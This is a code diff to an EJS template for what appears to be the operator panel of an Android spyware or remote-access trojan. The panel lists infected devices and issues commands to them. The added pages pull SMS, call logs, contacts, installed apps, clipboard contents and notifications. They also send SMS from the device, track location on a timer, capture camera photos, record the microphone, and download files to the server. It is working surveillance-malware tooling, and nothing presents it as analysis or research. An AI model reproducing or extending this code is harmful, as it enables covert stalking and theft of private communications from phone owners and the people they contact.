@@ -48,28 +48,648 @@
                     <p class="empty">This device doesn't exist in the database. It may have been removed or the ID is incorrect.</p>
                     <a href="/" class="btn primary">← Back to Dashboard</a>
                 </div>
-            <% } else { %>
-                <% if (data.client) { %>
-                <div class="device-status-bar">
-                    <div class="status-indicator <%= data.client.online ? 'online' : 'offline' %>">
-                        <span class="dot"></span>
-                        <span><%= data.client.online ? 'Online' : 'Offline' %></span>
+            <% } else if (page === 'info') { %>
+                <% const c = data.client; %>
+                <div class="card">
+                    <h2>Device Information</h2>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <label>Device ID</label>
+                            <code><%= c.id %></code>
+                        </div>
+                        <div class="info-item">
+                            <label>Status</label>
+                            <span class="badge <%= c.online ? 'success' : 'error' %>"><%= c.online ? 'Online' : 'Offline' %></span>
+                        </div>
+                        <div class="info-item">
+                            <label>Brand</label>
+                            <span><%= c.device?.brand || '—' %></span>
+                        </div>
+                        <div class="info-item">
+                            <label>Model</label>
+                            <span><%= c.device?.model || '—' %></span>
+                        </div>
+                        <div class="info-item">
+                            <label>Android Version</label>
+                            <span><%= c.device?.version || '—' %></span>
+                        </div>
+                        <div class="info-item">
+                            <label>IP Address</label>
+                            <code><%= c.ip || '—' %></code>
+                        </div>
+                        <div class="info-item">
+                            <label>Country</label>
+                            <span><%= c.country || '—' %></span>
+                        </div>
+                        <div class="info-item">
+                            <label>First Seen</label>
+                            <span><%= new Date(c.firstSeen).toLocaleString() %></span>
+                        </div>
+                        <div class="info-item">
+                            <label>Last Seen</label>
+                            <span><%= new Date(c.lastSeen).toLocaleString() %></span>
+                        </div>
                     </div>
-                    <div class="device-info-mini">
-                        <span>📱 <%= data.client.device?.brand || '' %> <%= data.client.device?.model || '' %></span>
-                        <% if (data.client.device?.version) { %>
-                        <span>Android <%= data.client.device.version %></span>
+                </div>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Quick Actions</h2>
+                    </div>
+                    <div class="btn-group">
+                        <button class="btn" onclick="sendCmd('0xLO')">📍 Get Location</button>
+                        <button class="btn" onclick="sendCmd('0xPM')">🔐 Check Permissions</button>
+                        <button class="btn" onclick="sendCmd('0xIN', {includeSystem: false})">📦 List Apps</button>
+                        <button class="btn" onclick="sendCmd('0xCO')">👥 Get Contacts</button>
+                        <button class="btn" onclick="sendCmd('0xCL')">📞 Get Call Logs</button>
+                        <button class="btn" onclick="sendCmd('0xSM', {action: 'ls'})">💬 Get SMS</button>
+                    </div>
+                </div>
+            <% } else if (page === 'sms') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>💬 SMS Messages</h2>
+                        <div class="btn-group">
+                            <button class="btn primary" onclick="sendCmd('0xSM', {action: 'ls'})">🔄 Refresh</button>
+                        </div>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">No SMS messages found. Click "Refresh" to load messages from the device.</p>
+                    <% } else { %>
+                    <p class="hint"><%= data.list.length %> messages</p>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Number</th>
+                                    <th>Message</th>
+                                    <th>Date</th>
+                                    <th>Type</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <% data.list.slice(0, 100).forEach(sms => { %>
+                                <tr>
+                                    <td><code><%= sms.address %></code></td>
+                                    <td class="wrap"><%= sms.body %></td>
+                                    <td><%= new Date(parseInt(sms.date)).toLocaleString() %></td>
+                                    <td><span class="badge <%= sms.type == 1 ? 'info' : 'success' %>"><%= sms.type == 1 ? 'Inbox' : 'Sent' %></span></td>
+                                </tr>
+                                <% }) %>
+                            </tbody>
+                        </table>
+                    </div>
+                    <% } %>
+                </div>
+                <div class="card">
+                    <h2>📤 Send SMS</h2>
+                    <p class="hint">Send an SMS message from the device.</p>
+                    <form onsubmit="sendSms(event)" style="margin-top: 1rem;">
+                        <div class="form-row">
+                            <input type="tel" id="sms-to" placeholder="Phone number" required style="flex: 1;">
+                        </div>
+                        <div class="form-row" style="margin-top: 0.5rem;">
+                            <input type="text" id="sms-msg" placeholder="Message" required style="flex: 2;">
+                            <button type="submit" class="btn primary">Send SMS</button>
+                        </div>
+                    </form>
+                </div>
+                <script>
+                function sendSms(e) {
+                    e.preventDefault();
+                    const to = document.getElementById('sms-to').value.trim();
+                    const msg = document.getElementById('sms-msg').value.trim();
+                    if (!to || !msg) { toast('Please enter both phone number and message', 'error'); return; }
+                    sendCmdNoReload('0xSM', {action: 'sendSMS', to: to, sms: msg})
+                        .then(() => {
+                            document.getElementById('sms-to').value = '';
+                            document.getElementById('sms-msg').value = '';
+                        });
+                }
+                </script>
+            <% } else if (page === 'calls') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Call Logs</h2>
+                        <button class="btn" onclick="sendCmd('0xCL')">Refresh</button>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">No call logs. Click Refresh to load.</p>
+                    <% } else { %>
+                    <p class="hint"><%= data.list.length %> calls</p>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Number</th>
+                                    <th>Duration</th>
+                                    <th>Date</th>
+                                    <th>Type</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <% data.list.slice(0, 100).forEach(call => { 
+                                    const types = {1: 'Incoming', 2: 'Outgoing', 3: 'Missed'};
+                                    const badges = {1: 'success', 2: 'info', 3: 'error'};
+                                %>
+                                <tr>
+                                    <td><%= call.name || '—' %></td>
+                                    <td><code><%= call.phoneNo %></code></td>
+                                    <td><%= Math.floor(call.duration / 60) %>m <%= call.duration % 60 %>s</td>
+                                    <td><%= new Date(parseInt(call.date)).toLocaleString() %></td>
+                                    <td><span class="badge <%= badges[call.type] || '' %>"><%= types[call.type] || 'Unknown' %></span></td>
+                                </tr>
+                                <% }) %>
+                            </tbody>
+                        </table>
+                    </div>
+                    <% } %>
+                </div>
+            <% } else if (page === 'contacts') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Contacts</h2>
+                        <button class="btn" onclick="sendCmd('0xCO')">Refresh</button>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">No contacts. Click Refresh to load.</p>
+                    <% } else { %>
+                    <p class="hint"><%= data.list.length %> contacts</p>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Phone</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <% data.list.forEach(c => { %>
+                                <tr>
+                                    <td><strong><%= c.name %></strong></td>
+                                    <td><code><%= c.phoneNo %></code></td>
+                                </tr>
+                                <% }) %>
+                            </tbody>
+                        </table>
+                    </div>
+                    <% } %>
+                </div>
+            <% } else if (page === 'gps') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>📍 Location Tracking</h2>
+                        <div class="btn-group">
+                            <button class="btn primary" onclick="sendCmd('0xLO')">📍 Get Location Now</button>
+                            <select id="gps-interval" onchange="setGpsInterval(this.value)">
+                                <option value="0" <%= data.interval == 0 ? 'selected' : '' %>>Auto: Off</option>
+                                <option value="10" <%= data.interval == 10 ? 'selected' : '' %>>Every 10s</option>
+                                <option value="30" <%= data.interval == 30 ? 'selected' : '' %>>Every 30s</option>
+                                <option value="60" <%= data.interval == 60 ? 'selected' : '' %>>Every 1m</option>
+                                <option value="300" <%= data.interval == 300 ? 'selected' : '' %>>Every 5m</option>
+                                <option value="600" <%= data.interval == 600 ? 'selected' : '' %>>Every 10m</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div id="map" style="height: 400px; border-radius: 8px; background: var(--card-alt); margin-top: 1rem;"></div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="hint" style="margin-top: 1rem;">No location data yet. Click "Get Location Now" or enable auto-tracking.</p>
+                    <% } %>
+                </div>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>📋 Location History</h2>
+                        <% if (data.list && data.list.length > 0) { %>
+                        <span class="hint"><%= data.list.length %> locations recorded</span>
                         <% } %>
-                        <% if (data.client.ip) { %>
-                        <span>🌐 <%= data.client.ip %></span>
-                        <% } %>
-                        <% if (data.client.country) { %>
-                        <span>📍 <%= data.client.country %></span>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">No location data available.</p>
+                    <% } else { %>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>#</th>
+                                    <th>Latitude</th>
+                                    <th>Longitude</th>
+                                    <th>Accuracy</th>
+                                    <th>Time</th>
+                                    <th></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <% data.list.slice(-30).reverse().forEach((loc, i) => { %>
+                                <tr>
+                                    <td><%= i + 1 %></td>
+                                    <td><code><%= loc.latitude?.toFixed(6) %></code></td>
+                                    <td><code><%= loc.longitude?.toFixed(6) %></code></td>
+                                    <td><%= loc.accuracy ? loc.accuracy.toFixed(0) + 'm' : '—' %></td>
+                                    <td><%= new Date(loc.time).toLocaleString() %></td>
+                                    <td><button class="btn small" onclick="centerMap(<%= loc.latitude %>, <%= loc.longitude %>)">View</button></td>
+                                </tr>
+                                <% }) %>
+                            </tbody>
+                        </table>
+                    </div>
+                    <% } %>
+                </div>
+                <script>
+                let mapInstance = null;
+                let markers = [];
+                document.addEventListener('DOMContentLoaded', function() {
+                    const locations = <%- JSON.stringify(data.list || []) %>;
+                    mapInstance = L.map('map').setView([0, 0], 2);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap contributors' }).addTo(mapInstance);
+                    if (locations.length > 0) {
+                        const last = locations[locations.length - 1];
+                        mapInstance.setView([last.latitude, last.longitude], 15);
+                        locations.forEach((loc, i) => {
+                            const marker = L.marker([loc.latitude, loc.longitude]).addTo(mapInstance)
+                                .bindPopup('<b>#' + (i + 1) + '</b><br>' + new Date(loc.time).toLocaleString() + '<br>Accuracy: ' + (loc.accuracy ? loc.accuracy.toFixed(0) + 'm' : 'N/A'));
+                            markers.push(marker);
+                        });
+                        if (locations.length > 1) {
+                            const line = locations.map(l => [l.latitude, l.longitude]);
+                            L.polyline(line, {color: '#3b82f6', weight: 3, opacity: 0.7}).addTo(mapInstance);
+                        }
+                    }
+                });
+                function centerMap(lat, lng) { if (mapInstance) mapInstance.setView([lat, lng], 16); }
+                function setGpsInterval(val) {
+                    const interval = parseInt(val);
+                    fetch('/gps/' + DEVICE_ID + '/' + interval, {method: 'POST'})
+                        .then(r => r.json())
+                        .then(d => { toast(interval > 0 ? 'GPS polling enabled (' + interval + 's)' : 'GPS polling disabled', d.success ? 'success' : 'error'); })
+                        .catch(() => { toast('Request failed', 'error'); });
+                }
+                </script>
+            <% } else if (page === 'camera') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>📷 Camera</h2>
+                        <div class="btn-group">
+                            <button class="btn primary" onclick="sendCmd('0xCA', {action: 'list'})">🔍 Detect Cameras</button>
+                        </div>
+                    </div>
+                    <div class="camera-grid">
+                        <% if (data.cameras && data.cameras.length > 0) { %>
+                            <% data.cameras.forEach(cam => { %>
+                            <button class="btn" onclick="sendCmd('0xCA', {action: 'capture', id: <%= cam.id %>})">📷 <%= cam.name || 'Camera ' + cam.id %></button>
+                            <% }) %>
+                        <% } else { %>
+                        <p class="empty">No cameras detected. Click "Detect Cameras" to scan for available cameras on the device.</p>
                         <% } %>
                     </div>
                 </div>
-                <% } %>
-                <%- include('pages/' + page, { data, id }) %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>📸 Captured Photos</h2>
+                        <% if (data.photos && data.photos.length > 0) { %>
+                        <span class="hint"><%= data.photos.length %> photos</span>
+                        <% } %>
+                    </div>
+                    <% if (!data.photos || data.photos.length === 0) { %>
+                    <p class="empty">No photos captured yet. Select a camera above to take a photo.</p>
+                    <% } else { %>
+                    <div class="photo-grid">
+                        <% data.photos.slice().reverse().forEach(p => { %>
+                        <div class="photo-item">
+                            <a href="<%= p.file %>" target="_blank" title="Click to view full size">
+                                <img src="<%= p.file %>" alt="Captured photo" loading="lazy">
+                            </a>
+                            <span class="photo-time"><%= new Date(p.time).toLocaleString() %></span>
+                        </div>
+                        <% }) %>
+                    </div>
+                    <% } %>
+                </div>
+            <% } else if (page === 'mic') { %>
+                <div class="card">
+                    <h2>🎤 Microphone Recording</h2>
+                    <p class="hint">Record audio from the device microphone. Audio files will appear in the Downloads page after recording completes.</p>
+                    <div class="form-row" style="margin-top: 1rem;">
+                        <select id="mic-duration">
+                            <option value="10">10 seconds</option>
+                            <option value="30">30 seconds</option>
+                            <option value="60" selected>1 minute</option>
+                            <option value="120">2 minutes</option>
+                            <option value="300">5 minutes</option>
+                            <option value="600">10 minutes</option>
+                        </select>
+                        <button class="btn primary" id="recordBtn" onclick="recordMic()">🎤 Start Recording</button>
+                    </div>
+                    <div id="recording-status" class="hidden" style="margin-top: 1rem; padding: 1rem; background: var(--bg); border-radius: 8px;">
+                        <div style="display: flex; align-items: center; gap: 0.5rem;">
+                            <span class="status-dot online" style="animation: pulse 1s infinite;"></span>
+                            <span id="status-text">Recording...</span>
+                        </div>
+                        <div class="progress-bar" style="margin-top: 0.5rem;">
+                            <div class="progress-fill" id="record-progress" style="width: 0%; background: var(--error);"></div>
+                        </div>
+                    </div>
+                </div>
+                <style>
+                @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+                </style>
+                <script>
+                function recordMic() {
+                    const sec = parseInt(document.getElementById('mic-duration').value);
+                    const btn = document.getElementById('recordBtn');
+                    const status = document.getElementById('recording-status');
+                    const progress = document.getElementById('record-progress');
+                    const statusText = document.getElementById('status-text');
+                    btn.disabled = true;
+                    btn.textContent = '⏳ Recording...';
+                    status.classList.remove('hidden');
+                    statusText.textContent = 'Recording ' + sec + ' seconds of audio...';
+                    let elapsed = 0;
+                    const interval = setInterval(() => {
+                        elapsed += 0.1;
+                        const pct = Math.min(100, (elapsed / sec) * 100);
+                        progress.style.width = pct + '%';
+                        if (elapsed >= sec) clearInterval(interval);
+                    }, 100);
+                    sendCmdNoReload('0xMI', {sec: sec})
+                        .then(() => { statusText.textContent = 'Recording complete! Check Downloads page.'; progress.style.width = '100%'; progress.style.background = 'var(--success)'; })
+                        .catch(() => { statusText.textContent = 'Recording failed'; progress.style.background = 'var(--error)'; })
+                        .finally(() => { setTimeout(() => { btn.disabled = false; btn.textContent = '🎤 Start Recording'; status.classList.add('hidden'); progress.style.width = '0%'; progress.style.background = 'var(--error)'; }, 3000); });
+                }
+                </script>
+            <% } else if (page === 'files') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>📁 File Manager</h2>
+                        <div class="btn-group">
+                            <button class="btn primary" onclick="browseFiles('')">🏠 Root</button>
+                            <button class="btn" onclick="browseFiles('/sdcard')">📱 SD Card</button>
+                            <button class="btn" onclick="browseFiles('/storage')">💾 Storage</button>
+                        </div>
+                    </div>
+                    <% if (data.path) { %>
+                    <div class="path-bar" style="display: flex; align-items: center; gap: 0.5rem;">
+                        <span style="color: var(--muted);">Path:</span>
+                        <code style="flex: 1;"><%= data.path %></code>
+                    </div>
+                    <% } %>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">Click a button above to browse device files. The device must be online to access files.</p>
+                    <% } else { %>
+                    <p class="hint" style="margin-bottom: 0.5rem;"><%= data.list.length %> items</p>
+                    <div class="file-list">
+                        <% data.list.forEach(f => { %>
+                        <div class="file-item" onclick="<%= f.isDir ? `browseFiles('${f.path}')` : `downloadFile('${f.path}')` %>" style="cursor: pointer;">
+                            <span class="file-icon"><%= f.isDir ? '📁' : '📄' %></span>
+                            <div style="flex: 1;">
+                                <div class="file-name"><%= f.name %></div>
+                                <% if (!f.isDir && f.size) { 
+                                   const bytes = f.size;
+                                   const k = 1024;
+                                   const sizes = ['B', 'KB', 'MB', 'GB'];
+                                   const i = Math.floor(Math.log(bytes) / Math.log(k));
+                                   const formatted = parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+                                %>
+                                <div class="hint" style="font-size: 0.75rem;"><%= formatted %></div>
+                                <% } %>
+                            </div>
+                            <% if (!f.isDir) { %>
+                            <button class="btn small" onclick="event.stopPropagation(); downloadFile('<%= f.path %>')">⬇ Download</button>
+                            <% } else { %>
+                            <span class="hint" style="font-size: 0.8rem;">→</span>
+                            <% } %>
+                        </div>
+                        <% }) %>
+                    </div>
+                    <% } %>
+                </div>
+                <div id="download-status" class="card hidden">
+                    <h2>⬇ Download Progress</h2>
+                    <div id="download-list"></div>
+                </div>
+                <script>
+                function browseFiles(path) { sendCmd('0xFI', {action: 'ls', path: path || ''}); }
+                function downloadFile(path) {
+                    const statusEl = document.getElementById('download-status');
+                    const listEl = document.getElementById('download-list');
+                    const fileName = path.split('/').pop();
+                    statusEl.classList.remove('hidden');
+                    const itemEl = document.createElement('div');
+                    itemEl.className = 'clipboard-item';
+                    itemEl.innerHTML = '<div style="display: flex; justify-content: space-between; align-items: center;"><span>📄 ' + fileName + '</span><span class="hint">Downloading...</span></div>';
+                    listEl.prepend(itemEl);
+                    sendCmdNoReload('0xFI', {action: 'dl', path: path})
+                        .then(() => { itemEl.innerHTML = '<div style="display: flex; justify-content: space-between; align-items: center;"><span>📄 ' + fileName + '</span><span class="badge success">Queued</span></div>'; toast('Download started! Check Downloads page when complete.', 'success'); })
+                        .catch(() => { itemEl.innerHTML = '<div style="display: flex; justify-content: space-between; align-items: center;"><span>📄 ' + fileName + '</span><span class="badge error">Failed</span></div>'; });
+                }
+                function formatSize(bytes) {
+                    if (!bytes || bytes === 0) return '0 B';
+                    const k = 1024;
+                    const sizes = ['B', 'KB', 'MB', 'GB'];
+                    const i = Math.floor(Math.log(bytes) / Math.log(k));
+                    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+                }
+                </script>
+            <% } else if (page === 'apps') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Installed Apps</h2>
+                        <div class="btn-group">
+                            <button class="btn primary" onclick="sendCmd('0xIN', {includeSystem: false})">User Apps</button>
+                            <button class="btn" onclick="sendCmd('0xIN', {includeSystem: true})">All Apps</button>
+                        </div>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">Click a button to load installed apps.</p>
+                    <% } else { %>
+                    <p class="hint">Found <%= data.list.length %> apps</p>
+                    <div class="app-grid">
+                        <% data.list.forEach(app => { %>
+                        <div class="app-item">
+                            <div class="app-name"><%= app.appName %></div>
+                            <div class="app-pkg"><code><%= app.packageName %></code></div>
+                            <div class="app-version">v<%= app.versionName %> <% if (app.isSystem) { %><span class="badge">System</span><% } %></div>
+                        </div>
+                        <% }) %>
+                    </div>
+                    <% } %>
+                </div>
+            <% } else if (page === 'clipboard') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Clipboard History</h2>
+                        <div class="btn-group">
+                            <button class="btn" onclick="sendCmd('0xCB', {action: 'fetch'})">Fetch</button>
+                            <button class="btn" onclick="sendCmd('0xCB', {action: 'start'})">Start Monitor</button>
+                        </div>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">No clipboard data captured. Click "Fetch" or "Start Monitor".</p>
+                    <% } else { %>
+                    <div class="clipboard-list">
+                        <% data.list.slice().reverse().slice(0, 30).forEach(c => { %>
+                        <div class="clipboard-item">
+                            <div class="clipboard-text"><%= c.text %></div>
+                            <div class="clipboard-time"><%= new Date(c.time).toLocaleString() %></div>
+                        </div>
+                        <% }) %>
+                    </div>
+                    <% } %>
+                </div>
+            <% } else if (page === 'notifications') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>🔔 Notifications</h2>
+                        <button class="btn" onclick="sendCmd('0xNO', {})">🔄 Refresh</button>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">No notifications captured yet. Click "Refresh" to fetch notifications from the device.</p>
+                    <% } else { %>
+                    <p class="hint"><%= data.list.length %> notifications captured</p>
+                    <div class="notif-list">
+                        <% data.list.slice().reverse().slice(0, 50).forEach(n => { %>
+                        <div class="notif-item">
+                            <div class="notif-header">
+                                <span class="notif-app"><%= n.appName %></span>
+                                <span class="notif-time"><%= new Date(n.time).toLocaleString() %></span>
+                            </div>
+                            <% if (n.title) { %><div class="notif-title"><%= n.title %></div><% } %>
+                            <% if (n.content) { %><div class="notif-content"><%= n.content %></div><% } %>
+                        </div>
+                        <% }) %>
+                    </div>
+                    <% } %>
+                </div>
+            <% } else if (page === 'wifi') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>📶 WiFi Networks</h2>
+                        <button class="btn primary" onclick="sendCmd('0xWI', {})">🔄 Scan Networks</button>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">Click "Scan Networks" to scan for nearby WiFi networks.</p>
+                    <% } else { %>
+                    <p class="hint"><%= data.list.length %> networks found</p>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>SSID</th>
+                                    <th>BSSID</th>
+                                    <th>Signal</th>
+                                    <th>Frequency</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <% data.list.forEach(w => { %>
+                                <tr>
+                                    <td><strong><%= w.SSID || '(Hidden)' %></strong></td>
+                                    <td><code><%= w.BSSID %></code></td>
+                                    <td>
+                                        <div class="signal-bar">
+                                            <div class="signal-level" style="width: <%= Math.min(100, Math.max(0, (w.level + 100) * 2)) %>%"></div>
+                                        </div>
+                                        <span><%= w.level %> dBm</span>
+                                    </td>
+                                    <td><%= w.frequency %> MHz</td>
+                                </tr>
+                                <% }) %>
+                            </tbody>
+                        </table>
+                    </div>
+                    <% } %>
+                </div>
+            <% } else if (page === 'permissions') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Granted Permissions</h2>
+                        <button class="btn" onclick="sendCmd('0xPM')">Refresh</button>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">Click Refresh to load permissions.</p>
+                    <% } else { %>
+                    <p class="hint"><%= data.list.length %> permissions granted</p>
+                    <div class="perm-grid">
+                        <% data.list.forEach(p => { const name = p.split('.').pop(); %>
+                        <div class="perm-item">
+                            <span class="perm-icon">✓</span>
+                            <span><%= name %></span>
+                        </div>
+                        <% }) %>
+                    </div>
+                    <% } %>
+                </div>
+            <% } else if (page === 'downloads') { %>
+                <div class="card">
+                    <div class="card-header">
+                        <h2>💾 Downloaded Files</h2>
+                        <div class="btn-group">
+                            <button class="btn" onclick="location.reload()">🔄 Refresh</button>
+                        </div>
+                    </div>
+                    <% if (!data.list || data.list.length === 0) { %>
+                    <p class="empty">No files downloaded yet. Use the File Manager or other features to download files from the device.</p>
+                    <% } else { %>
+                    <p class="hint"><%= data.list.length %> files</p>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Filename</th>
+                                    <th>Source</th>
+                                    <th>Downloaded</th>
+                                    <th></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <% data.list.slice().reverse().forEach((d, i) => { 
+                                    const ext = d.name?.split('.').pop()?.toLowerCase() || '';
+                                    const icon = ['mp3', 'mp4', 'm4a', 'wav'].includes(ext) ? '🎵' : 
+                                                 ['jpg', 'jpeg', 'png', 'gif'].includes(ext) ? '🖼️' :
+                                                 ['txt', 'log'].includes(ext) ? '📄' : '📁';
+                                %>
+                                <tr>
+                                    <td>
+                                        <div style="display: flex; align-items: center; gap: 0.5rem;">
+                                            <span><%= icon %></span>
+                                            <span><%= d.name %></span>
+                                        </div>
+                                    </td>
+                                    <td>
+                                        <% if (d.name?.includes('cam')) { %>
+                                        <span class="badge info">Camera</span>
+                                        <% } else if (d.name?.includes('mic')) { %>
+                                        <span class="badge info">Mic</span>
+                                        <% } else { %>
+                                        <span class="badge">File</span>
+                                        <% } %>
+                                    </td>
+                                    <td><%= new Date(d.time).toLocaleString() %></td>
+                                    <td>
+                                        <a href="<%= d.file %>" class="btn small primary" download="<%= d.name %>">⬇ Download</a>
+                                        <a href="<%= d.file %>" class="btn small" target="_blank">View</a>
+                                    </td>
+                                </tr>
+                                <% }) %>
+                            </tbody>
+                        </table>
+                    </div>
+                    <% } %>
+                </div>
+                <div class="card">
+                    <h2>ℹ️ About Downloads</h2>
+                    <p class="hint">Files downloaded from devices are stored on the server and can be accessed here. This includes:</p>
+                    <ul style="color: var(--muted); font-size: 0.9rem; margin-top: 0.5rem; padding-left: 1.5rem;">
+                        <li>Files from the File Manager</li>
+                        <li>Recorded audio from the Microphone</li>
+                        <li>Photos captured from the Camera</li>
+                    </ul>
+                </div>
+            <% } else { %>
+                <div class="card">
+                    <h2>Page Not Found</h2>
+                    <p class="empty">The requested page does not exist.</p>
+                    <a href="/device/<%= id %>/info" class="btn primary">← Go to Info</a>
+                </div>
             <% } %>
         </section>
     </main>
